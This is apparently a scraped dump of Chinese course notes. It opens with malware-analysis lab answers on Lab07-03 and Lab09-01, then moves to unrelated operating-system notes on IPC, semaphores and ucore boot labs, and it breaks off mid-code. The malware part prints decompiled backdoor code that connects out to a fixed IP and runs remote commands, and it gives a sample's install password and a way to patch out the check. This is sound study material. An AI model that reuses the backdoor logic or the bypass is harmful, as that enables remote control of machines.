我们发现其逻辑与调用这个函数的传入参数有着密切关系，我们考虑 sub_4011E0() 中调用的传入参数，发现又与 sub_4011E0 的传入参数有关，我们进一步分析主函数中传入的字符串，发现它是一个字面量：\n.data:00403044 ; CHAR aC[]\r.data:00403044 aC db 'C:\\*',0 ; DATA XREF: _main:loc_401806\u0018o\r也就是说它的传入参数是 C:\\*，进而分析 sub_4011E0 的逻辑：\n 猜测大概是将 C:\\* 匹配到的所有文件名作为参数依次传入 sub_4010A0 这个函数，我么们进一步分析传入的逻辑，发现需要匹配到 .exe 才会传入这个函数。 结合之前在调用图中发现的自调用，我们猜测 sub_4011E0 是一个用于处理文件夹的函数，sub_4010A0 则是一个用于处理文件的函数。  知道了 sub_4011E0 的参数之后，进一步分析它的伪代码，发现其中关键的三行：\nif ( !stricmp((const char *)v10, Str2) ) { qmemcpy(v10, \u0026amp;dword_403010, strlen((const char *)v10) + 1); v4 = v12; } 分析 Str2 的内容：\n.data:00403020 ; char Str2[]\r.data:00403020 Str2 db 'kernel32.dll',0 ; DATA XREF: sub_4010A0+CE\u0018o\r如果 v10 是 kernel32.dll 的还，则要替换 v10 的内容。也就是说这个恶意代码将要替换 kernel32.dll 这个动态链接库。暂时还分析不出是使用什么内容进行的替换，我们猜的使用的就是 Lab07-03.dll 这个动态链接库。于是，这个程序通过替换 kernel32.dll 文件达到持续运行的效果。\nQUESTION 2 #   What are two good host-based signatures for this malware?\n 上面的分析表示 Lab07-03.exe 这个文件修改了 C:\\* 中所有以 .exe 结尾的文件（可执行文件），并且将其中的 kernel32.dll 替换为新的动态链接库。\n由于暂时还未分析出替换的内容（这一部分应该是 main 函数中被忽略的部分的代码的逻辑），我们只能猜测这个动态链接库是 Lab07-03.dll（我觉得这个猜测非常合理）。\n因此恶意代码的核心是这个动态链接库完成的功能，我们进一步分析这个动态链接库。首先分析函数的导入表：\n发现这个动态链接库导入了 CreateProcessA，CreateMutexA，OpenMutexA 等线程相关函数，在左侧还发现它导入了 W32_32.dll 这个与网络请求相关的动态链接库。\n在 IdaPro 中，这个动态链接库有一个名为 DllMain 的函数，我们进一步分析这个函数的逻辑。查看其伪代码，在创建局部变量、加锁（名为 SADFHUHF）、条件判断等操作之后，进入了以下的主要代码流程：\nv3 = socket(2, 1, 6); if ( v3 != -1 ) { name.sa_family = 2; *(_DWORD *)\u0026amp;name.sa_data[2] = inet_addr(cp); *(_WORD *)\u0026amp;name.sa_data[0] = htons(0x50u); if ( connect(v3, \u0026amp;name, 16) != -1 ) { while ( send(v3, ::buf, strlen(::buf), 0) != -1 \u0026amp;\u0026amp; shutdown(v3, 1) != -1 ) { if ( recv(v3, \u0026amp;buf, 4096, 0) \u0026gt; 0 ) { if ( !strncmp(Str1, \u0026amp;buf, 5u) ) { Sleep(0x60000u); } else if ( !strncmp(aExec, \u0026amp;buf, 4u) ) { memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(0, \u0026amp;CommandLine, 0, 0, 1, 0x8000000u, 0, 0, \u0026amp;StartupInfo, \u0026amp;ProcessInformation); } else { if ( buf == 113 ) { CloseHandle(hObject); break; } Sleep(0x60000u); } } } } } closesocket(v3); 分析其逻辑，应用程序创建了一个套接字，主动连接到了 cp = 127.26.152.13 的 0x50 = 80 端口，并且接受三种字符串的传入内容：\n Str1 = sleep，应用程序会睡眠 0x60000 ms = 393216 ms = 6.5 min； aExec = exec，应用程序会创建一个供远程执行的 shell，执行任意代码； chr(113) = q，应用程序会结束。  综上所述，恶意代码感染的主机特征主要是以下两点：\n 创建了互斥量，其名称为 SADFHUHF； 改变了 C 盘中所有可执行文件的 kernel32.dll 动态链接库连接位置。  QUESTION 3 #   What is the purpose of this program?\n 从第二问的分析中我们知道这个程序只要完成的功能是给 127.26.152.13:80 建立一个可以远程执行的命令行。其实现的方式是更改了 C 盘上所有可执行文件的 kernel32.dll 链接位置。\nQUESTION 4 #   How could you remove this malware once it is installed?\n 它更改了 C 盘中的所有可执行文件，恢复系统相当困难。可以：\n 阅读完整的恶意代码的逻辑，并且用 C++ 写一个完整恢复的程序； 备份系统，直接恢复到系统最初的样子。  "},{"id":143,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-1/","title":"Lab9 1","section":"09","content":"lab 9-1 #  QUESTION 1 #   How can you get this malware to install itself?\n 在 BinaryCollection/ 文件夹下运行 diff 命令可以查看两个文件之间的差异：\n$ diff Chapter_9L/Lab09-01.exe Chapter_3L/Lab03-04.exe # 没有返回值说明这两个文件没有任何不同 我们发现 Lab09-01.exe 与 Lab03-04.exe 是同一个文件。在 Lab03-04 中，我们的分析结果是这个文件运行起来就直接闪退并且把自己删除了。\n我们先用 PE Explorer 查看这个函数的导入表内容：\n可见它导入的动态链接库以及其中调用的函数都非常敏感：\n KERNEL32.dll 中的 CopyFileA()、WriteFile() 等操作文件的函数， CreateProcess() 等操作进程、互斥量等相关的函数； ADVAPI32.dll 中的 RegSetValueExA() 等操作注册表的函数，CreateService()、DeleteService() 等控制系统服务的函数； SHELL32.dll 动态链接库仅导入了一个函数，但非常敏感：ShellExecuteA()； WS2_32.dll 则是 Windows Socket 编程中最常用的动态链接库，这说明这个程序会有网络请求。  然后我们用 Ida Pro 打开这个文件，查看其中的 main 函数伪代码，发现其中的主要代码结构是一个如下的 if 语句结构：\nint __cdecl main(int argc, const char **argv, const char **envp) { // ... // 此处定义了局部变量  if ( argc == 1 ) { if ( !sub_401000() ) sub_402410(); sub_402360(); } else { //.....  } return 0; } 我们对以上的伪代码逐行分析：\n 可以看到主函数的第一个条件分支语句就是判断命令行参数是否为 1，根据我们之前对病毒分析的经验知道 sub_402360() 这个函数的功能应该是删除可执行文件本身。而 sub_401000() 是一个判断函数，sub_402410() 则应该是进行报错的函数。 在条件分支的 else 分支中调用了更多的函数，我们进一步分析其中的逻辑。  sub_402510()：在命令行参数多于一个时，以命令行参数的最后一个字符串作为传入值的函数：\nint __cdecl sub_402510(int a1) { //.....  if ( strlen((const char *)a1) == 4 ) { if ( *(_BYTE *)a1 == 97 ) { v2 = *(_BYTE *)(a1 + 1) - *(_BYTE *)a1; if ( v2 == 1 ) { v3 = 99 * v2; if ( v3 == *(_BYTE *)(a1 + 2) ) result = (char)(v3 + 1) == *(_BYTE *)(a1 + 3); else result = 0; } else { result = 0; } } else { result = 0; } } else { result = 0; } return result; } 分析以上的伪代码，发现如果传入的字符串为 chr(97) + chr(97 + 1) + chr(99 * 1) + chr(97 + 3) = abcd 时返回真，否则返回 0。\n再进一步分析主函数的逻辑，得知运行的命令行命令为 ./Lab09-01.exe -in abcd\nQUESTION 2 #   What are the command-line options for this program? What is the password requirement?\n 根据对前面分析出的伪代码进行进一步分析，我们总结了命令行参数的表格：\n   命令行参数 执行的功能     ./.exe -in abcd 安装自身   ./.exe -re abcd 删除自身   ./.exe -c abcd 更新配置   ./.exe -cc abcd 打印配置    QUESTION 3 #   How can you use OllyDbg to permanently patch this malware, so that it doesn’t require the special command-line password?\n 将判断的逻辑改为反即可。比如将 if 语句中的跳转 jz 改成 jnz。\nQUESTION 4 #   What are the host-based indicators of this malware?\n 恶意代码创建了一个注册表项 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft \\XPS\\Configuration，同时它创建了一个服务，默认名称为恶意代码文件名，也可通过命令行参数指定。\nQUESTION 5 #   What are the different actions this malware can be instructed to take via the network?\n 通过读 Ida Pro 分析出来的伪代码，我们可以得到这个程序执行的网络命令内容：\n   命令格式 命令效果     SLEEP integer 应用程序睡眠 integers 钟   UPLOAD port filename 读取本地文件并向远程的指定主机端口发送   CMD port 执行命令并且通过指定端口发送执行结果    QUESTION 6 #   Are there any useful network-based signatures for this malware?\n 默认情况下，恶意代码向 http://www.practicalmalwareanalysis.com 发送 HTTP1.0GET 请求，格式为 ****/****.*** 其中 * 是随机的数字或字母字符。 可以通过 -c 命令配置目标主机、端口号等。\n"},{"id":144,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-2/","title":"Lab9 2","section":"09","content":"lab 9-2 #  QUESTION 1 #   What strings do you see statically in the binary?\n 首先使用 PEexplorer 中的反汇编功能查看其中的 .rdata 段：\nQUESTION 2 #   What happens when you run this binary?\n 运行程序，没有任何反应。 使用 Process Monitor 查看，存在一些文件和注册表操作。\nQUESTION 3 #   How can you get this sample to run its malicious payload?\n QUESTION 4 #  "},{"id":145,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/3.%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","title":"3.进程间通信","section":"2.进程与线程","content":"进程间通信 #  进程间需要通信，我们需要设计一了良好的结构，不使用中断的方式实现。在本节中将讨论进程间通信（Inter Process Comminucation, IPC）的问题。\n竞争条件 #  什么是竞争条件？\n 竞争条件 (race condition)：两个或多个进程共同读写某些共享资源，而最后的执行解决取决于进行运行时间的精确时序时，这种情况称为竞争条件。  怎样避免竞争条件？\n 互斥 (mutual exclusion)：以某种手段确保当一个进程在使用一个资源时，其他进程就不能对资源的做同样的操作； 我们把共享的内存进行访问的程序片段称作临界区域 (critical region)。如果我们通过合适的安排使得两个进程不可能同时处于临界区，就能够避免竞争条件。  忙等待的互斥 #  下面列举的这些实现互斥的方案，绝对性地禁止了两个进程共享一个资源：\n  屏蔽中断：顾名思义，一个进程或线程进入临界区域之后立即屏蔽所有中断，离开之前再打开中断；\n  锁变量：一种软件层面的解决方案。即设置一个共享的锁变量，其初始值为 0：\n 一个线程想要进入临界区之前需要先测试锁变量的值，为 1 则继续等待； 如果为 0，则线程进入这个临界区，并且将锁变量的值设置为 1，离开时重置；  显然，但其实这种方法仍然会有概率导致多个线程同时进入临界区。\n  严格轮换法：设置一个变量用于记录当前可以进入临界区的线程，各个线程连续测试这个变量是否出现给定的值。这种方式称为忙等待 (busy waiting)，忙于等待的锁称为自旋锁 (spin lock)。\n由于这种方式是浪费 CPU 时间的，通常会避免。只有在有理由认为等待时间非常短的情况下，才使用。\n  Peterson 解法：荷兰数学家 T.Dekker 提出的一种不需要严格轮换的软件互斥算法。后来 Peterson 发现了一种更简单的互斥算法。\n这个算法的核心是 enter_region 与 leave_rigion 这样两个函数，比如我们有 2 个线程：\n#define N 2\t// 表示一共有两个线程，下面两个函数的传参都是指线程号，共有 01 两种取值 int turn;\t// 当前实际可以占用资源的进程号 int interested[N]; void enter_region(int process) { int other = 1 - process;\t// 另一个进程号  interested[other] = TRUE; turn = process; while(turn==process \u0026amp;\u0026amp; interested[other] == TRUE); } void leave_region(int process) { interested[process] = FALSE; } 如果一个线程调用了 enter_region 函数，但是并没有获得 turn 的赋值，那么说明这个线程获取资源失败，可以再次调用函数，则函数会进入等待状态。\n  TSL 指令：指 Test and Set Lock，测试并加锁。它的汇编格式如下：\nTSL RX,LOCK 它将一个内存字 LOCK 读取到 RX 中，并且在 LOCK 上置放一个非零值，这两步读写操作是不可分割的。\n  上面列举的这些方法都是正确的，但是它们都有忙等的缺点，也就是说：\n 当一个进程想要进入临界区时，先检查是否会允许进入，若不允许，该进程将原地等待直到允许为止；  解决这个缺点最简单的方法是 sleep 和 wakeup：\n sleep：一个将引起进程阻塞的系统调用，即被挂起，知道收到被唤醒的信号； wakeup：也就是唤醒一个指定进程的操作。  消费者生产者问题 #  问题 #  考虑这样一个问题：两个进程共享一个缓冲区。其中一个生产者，将信息放入缓冲区；另一个是消费者，将信息从缓冲区中取出。一个比较正常的处理办法是以下的方式：\n#define N 100\t// 缓冲区的数目 int count = 0;\t// 当前存在信息的缓冲区数目  void producer() { int item; while(TRUE) { item = produce_item(); if (count == N) sleep(); insert_item(item); count += 1; if (count == 1) wakeup(consumer); } } void consumer() { int item; while(TRUE) { if (count == 0) sleep(); item = remove_item(); count -= 1; if (count == N-1) wakeup(producer); consume_item(item); } } 这种处理办法看起来很好，但是它是存在问题的：\n 如果消费者检测到 0，sleep 函数还没开始执行，生产者发送的 wakeup 信号就已经到达，那么传递给消费者的 wakeup 信号将丢失，两个线程有可能永久沉睡下去。 这个问题就叫做消费者生产者问题。  信号量 #  Dijkstra 引入了一个新的变量类型信号量 (semaphore) 用来记录线程被唤醒的次数。他建议设定两种操作，将其命名为 down 和 up，分别对应一个线程的 sleep 与 wakeup 函数，伪代码大致如下：\nint semaphore = 0;\t// 信号量  void down() { while (TRUE) { if (semaphore \u0026gt; 0) { semaphore -= 1; return; } sleep(); } } void up() { semaphore += 1; wakeup(); } 引入信号量的概念可以解决消费者生产者问题：\n#define N 100 typedef int semaphore; semaphore full = 0; semaphore empty = N; semaphore mutex = 1; void producer() { int item; while (TURE) { item = produce_item(); down(\u0026amp;empty); down(\u0026amp;mutex); insert_item(item); up(\u0026amp;mutex); up(\u0026amp;full); } } void consumer() { int item; while (TRUE) { down(\u0026amp;full); down(\u0026amp;mutex); item = remove_item(); up(\u0026amp;mutex); up(\u0026amp;empty); consume_item(item); } }  解决方案中一共提供了三个信号量：  一个称为 full，用来记录被占用缓冲区的数目，初始值为 0； 一个称为 empty，用来记录空闲缓冲区的数目，初始值为 N（缓冲区的总数）； 一个称为 mutex，锁变量，用来确保消费者生产者不会同时访问缓冲区。    信号量的另一种用途是实现同步 (synchronization)。\n互斥量 #  如果不需要信号量的计数能力，有时可以使用信号量的简化版本互斥量 (mutex)。它仅仅适用于管理或共享一小段代码，因为互斥量实现时既容易又有效，这在实现用户线程包的时候非常有用。\n"},{"id":146,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe1/","title":"Exe1","section":"lab1","content":"exe1 #  make #  make命令执行需要一个makefile文件，以告诉make命令需要如何去编译和链接程序。\n 如果工程没有被编译过，所有的c文件都要编译并被链接。 如果某几个c文件被修改，那么只编译被修改的c文件，并链接目标程序。 如果工程的头文件被修改了，那么需要编译引用了这几个头文件的c文件，并链接目标程序  target... : prerequisites... command ... ... target也就是一个目标文件，可以是object file,也可以是执行文件。还可以是一个label。prerequisites就是要生成target所需要的文件或是目标。command就是make需要执行的命令。target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。如果prerequisites中有一个以上的文件比target文件要新，那么command所定义的命令就会被执行。\n问题 1 #   操作系统镜像文件ucore.img是如何一步一步生成的?(需要比较详细地解释Makefile中每 一条相关命令和命令参数的含义,以及说明命令导致的结果)\n ucore.img #  makefile中生成ucore.img的代码为：\nUCOREIMG\t:= $(call totarget,ucore.img) $(UCOREIMG): $(kernel) $(bootblock) $(V)dd if=/dev/zero of=$@ count=10000 $(V)dd if=$(bootblock) of=$@ conv=notrunc $(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc $(call create_target,ucore.img) 将ucore.img传入totarget表达式调用call函数结果赋值给变量UCOREIMG，UCOREIMG作为target，其依赖于两个文件，一个是kernel，一个是bootblock。接下来给出make需要执行的命令。首先从/dev/zero中读了10000*512块的空字节，生成空文件，接着将bootlock中的内容拷贝到目标文件，然后从输文件的512字节后继续写入kernel的内容。makefile的第六行V := @将@赋值给变量V，所以$(V)代指@,表示命令不回显。conv=notrunc代表不截断输出文件，count=n’ 代表从输入文件中拷贝n个大小为ibs byte的块，ibs默认为512字节。seek=n代表在拷贝前输出文件时跳过n 个‘obs’-byte的块。obs默认为512字节。所以seek=1代表跳过输出文件的512个字节。\nkenel：\nkernel = $(call totarget,kernel) $(kernel): tools/kernel.ld $(kernel): $(KOBJS) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS) @$(OBJDUMP) -S $@ \u0026gt; $(call asmfile,kernel) @$(OBJDUMP) -t $@ | $(SED) \u0026#39;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d\u0026#39; \u0026gt; $(call symfile,kernel) $(call create_target,kernel) kernel的生成依赖于KOBJS和tools/kernel.ld，生成命令依赖于i386-elf-objdump 、ld和objdump等。\n第五行链接各种文件输出给目标文件，第六行反汇编目标文件输出给asmfile这个变量。第七行输出目标文件的符号表并进行文本替换。最后写入symfile这个变量。\nbootblock #  bootfiles = $(call listf_cc,boot) $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),$(CFLAGS) -Os -nostdinc)) bootblock = $(call totarget,bootblock) $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 $^ -o $(call toobj,bootblock) @$(OBJDUMP) -S $(call objfile,bootblock) \u0026gt; $(call asmfile,bootblock) @$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock) @$(call totarget,sign) $(call outfile,bootblock) $(bootblock) $(call create_target,bootblock) bootblock 依赖于bootasm.o、bootmain.o、sign生成bootblock的编译指令为：\nld -m elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o  -m 模拟为i386上的连接器 -nostdlib 不使用标准库 -N 设置代码段和数据段均可读写 -e 指定入口 -Ttext 制定代码段开始位置 -fno-builtin:除非用__builtin_前缀，否则不进行builtin函数的优化  问题 2 #   一个被系统认为是符合规范的硬盘主引导扇区的特征是什么?\n sign:外部执行程序,用来生成虚拟的硬盘主引导扇区\n从sign.c代码中：\nif (st.st_size \u0026gt; 510) { fprintf(stderr, \u0026#34;%lld \u0026gt;\u0026gt; 510!!\\n\u0026#34;, (long long)st.st_size); return -1; } ... buf[510] = 0x55; buf[511] = 0xAA; 主引导扇区有512个字节，第511字节写入0x55，第512字节写入0xAA。\n"},{"id":147,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe2/","title":"Exe2","section":"lab1","content":"exe2 #  使用 qemu 执行并调试 lab1 中的软件。\n为了更加简易地对 gdb 进行调试，我们应该安装 peda。但是我发现这个内核调试的版本并不能显示颜色，很多乱码，所以并没有什么卵用。\nSTEP-1 #   从 CPU 加电后执行的第一条指令开始，单步跟踪 BIOS 的执行\n 可以在 Makefile 的第 219-222 行看到 make 列举的命令中，有一个叫做 debug 的命令：\ndebug: $(UCOREIMG) $(V)$(QEMU) -S -s -parallel stdio -hda $\u0026lt; -serial null \u0026amp; $(V)sleep 2 $(V)$(TERMINAL) -e \u0026#34;gdb -q -tui -x tools/gdbinit\u0026#34; 这三行命令分别执行：\n  使用 qemu 运行 32 位程序的虚拟机，这个变量值在 Makefile 的 27 行进行赋值，在我的 Ubuntu 中这个变量的最终赋值是 qemu-system-i386。要查看上面各个命令的含义使用 manual 即可：\n$ qemu-system-i386 --help 使用到的选项含义如下：\n -S： 在启动时不启动 CPU， 需要在 monitor 中输入 c，才能让 qemu 继续模拟工作。 -s：等待 gdb 连接到端口 1234； -hda $\u0026lt;：使用 $\u0026lt; 作为硬盘0、1、2、3镜像。其中 $\u0026lt; 指第一个依赖，也就是 $(UCOREIMG)； -parallel stdio：重定向虚拟并口到主机设备 studio 中； -serial null：不重定向虚拟串口到主机设备。    sleep 2：程序休眠两秒钟；\n  第三行以执行 gdb 的方式，打开一个终端，其中使用 tools/gdbinit 作为初始化配置。\n  根据附录中的内容，一顿瞎操作，我们需要把 ./tools/gdbinit 改成下面的样子：\n# ./tools/gdbinit set architecture i8086 target remote :1234 define hook-stop x /i (($cs \u0026lt;\u0026lt; 4) + $pc) end   前面两行的意思是：告诉 gdb 设置 32 位程序，并且把 gdb 通过 1234 网络端口链接到 qemu；\n  后面三行的意思是：加入一个停止的钩子，也就是说每次停止时会执行中间的语句；\n  原本的题目中给出的语句是 x /i $pc。但是根据附录中的提示，真实的执行位置是虚拟得到的，也就是通过 $cs. 寄存器与 $pc 寄存器计算而来，因此我们得到了上面的语句。\n  最后我们在 bash 中执行下面的命令就可以了：\n$ make debug 我也不知道为什么第一次没有 hook 到 stop，需要手动显示：\n0x0000fff0 in ?? () (gdb) x /i (($cs \u0026lt;\u0026lt; 4) + $pc) 0xffff0: ljmp $0xf000,$0xe05b 可以看到 CPU 加电后的第一条指令是 ljmp 长转移指令，也就是说第一条指令是 0xfe05b 位置的指令。\nSTEP-2 \u0026amp; STEP-3 #   在初始化位置 0x7c00 设置实地址断点,测试断点正常。\n从 0x7c00 开始跟踪代码运行,将单步跟踪反汇编得到的代码与 bootasm.S. 和 bootblock.asm 进行比较。\n 更改 ./tools/gdbinit 为下面的形式：\n# ./tools/gdbinit set architecture i8086 target remote :1234 define hook-stop x /10i (($cs \u0026lt;\u0026lt; 4) + $pc) end break *0x7c00 continue 可以看到它得到的反汇编代码：\n=\u0026gt; 0x7c00: cli 0x7c01: cld 0x7c02: xor %ax,%ax 0x7c04: mov %ax,%ds 0x7c06: mov %ax,%es 0x7c08: mov %ax,%ss 0x7c0a: in $0x64,%al 0x7c0c: test $0x2,%al 0x7c0e: jne 0x7c0a 0x7c10: mov $0xd1,%al 0x7c12: out %al,$0x64 0x7c14: in $0x64,%al 0x7c16: test $0x2,%al 0x7c18: jne 0x7c14 0x7c1a: mov $0xdf,%al 0x7c1c: out %al,$0x60 0x7c1e: lgdtw 0x7c6c 0x7c23: mov %cr0,%eax 0x7c26: or $0x1,%eax 0x7c2a: mov %eax,%cr0 boot/bootasm.S 的文件内容如下：\n#include \u0026lt;asm.h\u0026gt; # Start the CPU: switch to 32-bit protected mode, jump into C. # The BIOS loads this code from the first sector of the hard disk into # memory at physical address 0x7c00 and starts executing in real mode # with %cs=0 %ip=7c00. .set PROT_MODE_CSEG, 0x8 # kernel code segment selector .set PROT_MODE_DSEG, 0x10 # kernel data segment selector .set CR0_PE_ON, 0x1 # protected mode enable flag # start address should be 0:7c00, in real mode, the beginning address of the running bootloader .globl start start: .code16 # Assemble for 16-bit mode cli # Disable interrupts cld # String operations increment # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero movw %ax, %ds # -\u0026gt; Data Segment movw %ax, %es # -\u0026gt; Extra Segment movw %ax, %ss # -\u0026gt; Stack Segment # Enable A20: # For backwards compatibility with the earliest PCs, physical # address line 20 is tied low, so that addresses higher than # 1MB wrap around to zero by default. This code undoes this. seta20.1: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.1 movb $0xd1, %al # 0xd1 -\u0026gt; port 0x64 outb %al, $0x64 # 0xd1 means: write data to 8042's P2 port seta20.2: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 0xdf -\u0026gt; port 0x60 outb %al, $0x60 # 0xdf = 11011111, means set P2's A20 bit(the 1 bit) to 1 # Switch from real to protected mode, using a bootstrap GDT # and segment translation that makes virtual addresses # identical to physical addresses, so that the # effective memory map does not change during the switch. lgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 # Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u0026gt; DS: Data Segment movw %ax, %es # -\u0026gt; ES: Extra Segment movw %ax, %fs # -\u0026gt; FS movw %ax, %gs # -\u0026gt; GS movw %ax, %ss # -\u0026gt; SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain # If bootmain returns (it shouldn't), loop. spin: jmp spin # Bootstrap GDT .p2align 2 # force 4 byte alignment gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt 二者是相同的，与 ./obj/bootblock.asm 中的代码也是相同的。\n从 boot/bootasm.S 可以看到这段代码的主要功能是：\n 初始化数据段、额外段、栈区等； 进行与早期 PC 兼容的操作，如果地址线超过总线长，高位会被清零； 从实模式切换到保护模式，使得物理地址表示转换为虚拟地址表示。  STEP-4 #   自己找一个bootloader或内核中的代码位置，设置断点并进行测试。\n 参考 git 版本仓库中 HEAD 的 gdbinit 版本：\nfile bin/kernel target remote :1234 break kern_init continue 这个版本 break 在了 kern_init 这个函数，并且有源码进行 debug。\n"},{"id":148,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe3/","title":"Exe3","section":"lab1","content":"exe3 #  问题1 #   为何开启 A20,以及如何开启 A20\n 为了与早期的pc机兼容，物理地址线20(实模式)置于低位不能使用。所以超过1MB的地址，默认就会返回到地址0。寻址空间只有1MB。\n开启A20：\nseta20.1: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.1 movb $0xd1, %al # 0xd1 -\u0026gt; port 0x64 outb %al, $0x64 # 0xd1 means: write data to 8042's P2 port 从0x64端口读入一个字节的数据到al中，如果a1第二位不为0，则跳转到seta20.1接着执行检查a1的第二位是不是0。将0xd1写入到al中，再将al中的数据写入到端口0x64中。\nseta20.2: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 0xdf -\u0026gt; port 0x60 outb %al, $0x60 # 0xdf = 11011111, means set P2's A20 bit(the 1 bit) to 1 从0x64端口读入一个字节的数据到al中，如果a1第二位不为0，则跳转到seta20.2接着执行检查a1的第二位是不是0。将0xdf写入到al中，再将al中的数据写入到端口0x60中。\n 如何初始化GDT表\n #define SEG_NULLASM \\ .word 0, 0; \\ .byte 0, 0, 0, 0 #define SEG_ASM(type,base,lim) \\ .word (((lim) \u0026gt;\u0026gt; 12) \u0026amp; 0xffff), ((base) \u0026amp; 0xffff); \\ .byte (((base) \u0026gt;\u0026gt; 16) \u0026amp; 0xff), (0x90 | (type)), \\ (0xC0 | (((lim) \u0026gt;\u0026gt; 28) \u0026amp; 0xf)), (((base) \u0026gt;\u0026gt; 24) \u0026amp; 0xff) gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel #初始化空段，代码段和数据段 gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt #gdt大小和地址 在该文件的第十行定义了 CR0_PE_ON 变量等于 1 ,加载全局描述符寄存器gdtr，通过lgdt指令将全局描述符入口地址装入gdtr寄存器中。然后将控制寄存器cr0的值装载入eax中，将eax的值设置为1，然后将eax的值装载入cr0中，cr0为1时代表进入保护模式。\n 如何使能和进入保护模式\n 翻译下面代码注释得到以下结论\nlgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 先将A20开启进入32位寻址模式，然后初始化GDT表，然后设置cr0控制寄存器为1，表示进入保护模式，然后跳转到32位模式中的下一条指令将处理器切换为32位工作模式，设置数据段寄存器，设置栈指针，并且调用bootmain函数。\n# Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u0026gt; DS: Data Segment movw %ax, %es # -\u0026gt; ES: Extra Segment movw %ax, %fs # -\u0026gt; FS movw %ax, %gs # -\u0026gt; GS movw %ax, %ss # -\u0026gt; SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain "},{"id":149,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe4/","title":"Exe4","section":"lab1","content":"exe4 #   分析 bootloader 加载 ELF 格式的 OS 的过程\n bootmian.c #  让我们简单地翻译一下这个文件的注释：\n磁盘内存布局：\n 这个程序是一个启动加载器 (bootloader)，它应该在磁盘的第一个扇区上； 紧接着的第二个扇区存储着内核的镜像，它必须是一个 ELF 格式的文件。  启动的流程：\n 当 CPU 启动时，它首先将 BIOS 加载进内存中，然后执行它； 然后 BIOS 会初始化中断周期，然后取出启动程序的第一个选区然后跳转到它； 如果启动加载器存储在第一个扇区，控制权就转移到了这个文件中的代码（具体是在 bootasm.S 这个文件中调用的 bootmain() 这个函数）； 当这个文件中的函数执行完毕之后，内核会被读入，控制权会被转移给内核。  问题一 #   Boot loader 如何读取硬盘扇区的？\n 我们看文件中函数 readsect 的注释，就知道用来读取硬盘扇区的是这个函数，我们来逐行解释这个函数：\n/* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready  waitdisk(); outb(0x1F2, 1); // count = 1  outb(0x1F3, secno \u0026amp; 0xFF); outb(0x1F4, (secno \u0026gt;\u0026gt; 8) \u0026amp; 0xFF); outb(0x1F5, (secno \u0026gt;\u0026gt; 16) \u0026amp; 0xFF); outb(0x1F6, ((secno \u0026gt;\u0026gt; 24) \u0026amp; 0xF) | 0xE0); outb(0x1F7, 0x20); // 